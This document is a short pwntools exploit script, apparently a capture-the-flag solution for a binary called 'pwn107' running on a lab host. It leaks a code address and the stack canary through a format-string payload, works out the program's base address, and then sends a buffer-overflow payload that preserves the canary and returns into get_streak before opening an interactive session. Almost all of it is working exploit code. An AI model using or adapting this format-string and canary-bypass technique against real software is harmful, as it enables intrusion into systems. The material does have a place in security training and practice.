'''

$input = 6
Address of ld-linux-x86-64.so.2: $input + 4 = 10
Canary at $input + 7 - 13
%4$lx.%13$lx
'''

from pwn import *
context.binary = binary = ELF("./pwn107", checksec=False)
context.log_level = "debug"
static_dl_main = binary.symbols.__libc_csu_init
print("Address of static libc csu init: {}".format(hex(static_dl_main)))
#p = process()
p = remote('10.10.109.112', 9007)
p.recvuntil('streak? ')
payload = "%10$lx.%13$lx"
p.sendline(payload)
p.recvuntil('streak: ')
output = p.recvline()
dynamic_dl_main = int(output.strip().split(b'.')[0], 16)
canary_value =int(output.strip().split(b'.')[1], 16)
print("Dynamic address: {} canary is {}".format(hex(dynamic_dl_main), hex(canary_value)))

base_address = dynamic_dl_main - static_dl_main
print("base address: ", base_address)
binary.address = base_address #form now on, all address will real address when running
dynamic_get_streak = binary.symbols.get_streak
rop = ROP(binary)
ret_gadget = rop.find_gadget(['ret'])[0]
payload = b"A" * (40 -16) + p64(canary_value) + b"A"*8 + p64(ret_gadget) + p64(dynamic_get_streak)
p.sendline(payload)
p.interactive()



